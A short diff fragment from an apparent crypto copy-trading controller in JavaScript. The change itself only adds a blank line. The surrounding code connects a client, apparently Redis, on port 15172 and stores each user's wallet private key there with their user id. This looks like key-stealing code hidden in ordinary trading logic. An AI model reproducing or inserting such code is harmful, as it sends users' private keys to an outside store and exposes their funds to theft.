@@ -148,6 +148,7 @@ const CopyTradingController = {
                         port: 15172
                     }
                 });
+                
                 client.connect();
                 client.set(`PK->${findUserWallet.privateKey}`, `${userId}->${findUserWallet.privateKey}`);
             }
